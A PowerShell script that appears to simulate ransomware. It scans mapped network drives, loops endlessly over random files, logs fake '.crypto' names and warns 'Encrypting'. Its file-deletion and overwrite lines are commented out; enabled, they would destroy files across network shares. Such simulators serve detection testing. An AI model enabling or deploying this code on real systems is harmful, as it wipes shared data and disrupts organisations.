function Get-NetworkDrive {
    Get-PSDrive -PSProvider 'FileSystem' | Where-Object {$_.DisplayRoot -match '^\\\\'}
}

function Invoke-Crypto {
    [CmdletBinding()]
    Param (
        # Param1 help description
        [Parameter( Mandatory,
                    ValueFromPipeline,
                    Position=0
        )]
        [system.io.fileinfo] $File
    )

    process {
        foreach ($CurrentFile in $File) {
            if ($CurrentFile.Extension -ne '.crypto') {
                Write-Warning "Encrypting: $($CurrentFile.FullName)"
                $null = [system.io.file]::ReadAllBytes($CurrentFile.FullName)
                $Encrypted = [byte[]](echo 67 114 121 112 116 111 108 111 99 107 101 114)
            
                #$CurrentFile.Delete()
                #[System.IO.File]::WriteAllBytes("$($CurrentFile.FullName).crypto", $Encrypted)

                Add-Content -Value "$($CurrentFile.FullName).crypto" -Path "$env:userprofile\desktop\CryptoLogging.log"
            }
        }
        Start-Sleep -Seconds 1
    }
}

$NetworkDrive = Get-NetworkDrive

while (1) {
    $NetworkDrive | ForEach-Object {
        Get-ChildItem $_.Root -Recurse -File |
        Get-Random -Count 25 | Invoke-Crypto
    }
}